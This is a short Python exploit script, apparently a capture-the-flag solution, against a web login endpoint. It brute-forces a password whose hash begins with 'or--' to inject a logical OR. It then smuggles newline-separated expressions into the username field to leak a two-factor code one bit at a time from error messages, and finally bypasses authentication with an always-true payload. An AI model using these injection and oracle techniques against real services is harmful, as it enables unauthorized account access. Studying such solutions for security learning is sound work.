#!/usr/bin/env python3
import requests
import base64
import hashlib
import sys

host = f"{sys.argv[1]}:{sys.argv[2]}"

def hashf(s):
    return base64.urlsafe_b64encode(hashlib.sha256(s.encode()).digest()).decode().strip('=')

print('Offline brute force for a hash resulting in "or--" ...')

pw = 0
while 1:
    pw += 1
    if hashf(str(pw))[:4].lower() == 'or--':
        break

pw = str(pw)
print(f'Found: {pw}')
print('Leaking two factor...')

twofac = 0
for n in range(31, -1, -1):
    r = requests.post(f'http://{host}/login', json={
            'username': f'?\ntwofac>>{n}&1;',
            'password': pw,
            'twofac': 0
        })
    twofac <<= 1
    twofac |= 'Incorrect two factor.' == r.json()['message']

print(f'Leaked: {twofac}')

r = requests.post(f'http://{host}/login', json={
    'username': '?\n1;',
    'password': pw,
    'twofac': twofac
})
print(r.json()['message'])
